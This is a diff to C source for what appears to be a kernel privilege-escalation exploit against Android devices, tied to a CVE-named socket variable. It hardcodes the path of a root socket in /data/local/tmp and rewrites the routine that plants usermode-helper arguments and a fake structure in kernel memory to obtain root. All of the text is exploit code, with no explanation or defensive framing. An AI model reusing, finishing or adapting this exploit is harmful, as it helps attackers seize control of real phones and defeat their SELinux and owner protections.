@@ -35,8 +35,6 @@
 #define KS_SELINUX_LOCK_OFF 0xb00
 #define KS_OWNER_LOCK_OFF 0xc00
 #define ROOT_SOCKET_PATH "/data/local/tmp/temp_su.sock"
-#define SU_SOCKET_ENV "CVE43499_SU_SOCKET"
-#define SU_SOCKET_PATH_OFF 0x200
 #define RECLAIM_ATTEMPT_TIMEOUT_MS 120000
 #define Q0_WRITE_ATTEMPTS 4
 #define Q0_WRITE_ATTEMPT_DELAY_MS 300
@@ -140,9 +138,7 @@ static long long now_ms(void) {
 }
 
 static const char *su_socket_path(void) {
-  const char *override = getenv(SU_SOCKET_ENV);
-
-  return override && *override ? override : ROOT_SOCKET_PATH;
+  return ROOT_SOCKET_PATH;
 }
 
 static void put64(unsigned char *page, size_t offset, uint64_t value) {
@@ -411,7 +407,7 @@ static int daemon_present(void) {
     fclose(stream);
     if (length > 0) {
       cmdline[length] = 0;
-      if (strstr(cmdline, term) && strstr(cmdline, su_socket_path())) {
+      if (strstr(cmdline, term)) {
         found = 1;
         break;
       }
@@ -568,8 +564,7 @@ static int install_umh_root(int fd, uint64_t alias, uint64_t slide) {
   data.argv[0] = data_address + offsetof(struct umh_kernel_data, path);
   data.argv[1] = data_address + offsetof(struct umh_kernel_data, arg);
   data.argv[2] = data_address + offsetof(struct umh_kernel_data, uid);
-  data.argv[3] = data_address + SU_SOCKET_PATH_OFF;
-  data.argv[4] = 0;
+  data.argv[3] = 0;
   data.envp[0] = 0;
 
   memset(&fake, 0, sizeof(fake));
@@ -587,8 +582,6 @@ static int install_umh_root(int fd, uint64_t alias, uint64_t slide) {
 
   unlink(su_socket_path());
   if (!write_exact(fd, data_address, &data, sizeof(data)) ||
-      !write_exact(fd, data_address + SU_SOCKET_PATH_OFF, su_socket_path(),
-                   strlen(su_socket_path()) + 1) ||
       !write_exact(fd, work, &fake, sizeof(fake))) {
     fprintf(stderr, "ROOT_FAIL payload write errno=%d %s\n", errno,
             strerror(errno));
